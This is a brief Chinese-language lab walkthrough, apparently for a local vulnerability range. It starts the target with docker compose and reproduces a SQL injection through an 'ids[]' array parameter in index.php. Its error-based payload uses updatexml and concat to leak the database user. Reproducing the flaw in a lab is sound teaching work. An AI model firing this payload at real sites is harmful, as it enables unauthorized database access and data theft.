启动靶场：
```
docker compose up -d
```
SQL注入
```
http://your-ip/index.php?ids[]=1&ids[]=2
```
看到用户名显示出来

```
http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
```
爆出信息